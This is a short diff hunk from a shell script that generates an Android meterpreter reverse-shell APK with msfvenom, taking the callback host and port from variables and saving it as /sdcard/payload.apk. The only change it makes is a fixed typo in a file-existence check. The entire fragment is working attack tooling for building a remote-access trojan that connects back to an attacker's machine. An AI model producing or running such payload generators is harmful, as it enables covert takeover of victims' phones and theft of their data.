@@ -53,5 +53,5 @@ echo "Generating Payload Please Wait..." |lolcat -a
 
 ~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > /sdcard/payload.apk
 
-[ f- /sdcard/payload.apk ] && echo "Payload 'payload.apk' is ready. Check it in your phone storage" |lolcat -a || echo "It seems somthing went wrong"
+[ -f /sdcard/payload.apk ] && echo "Payload 'payload.apk' is ready. Check it in your phone storage" |lolcat -a || echo "It seems somthing went wrong"
 
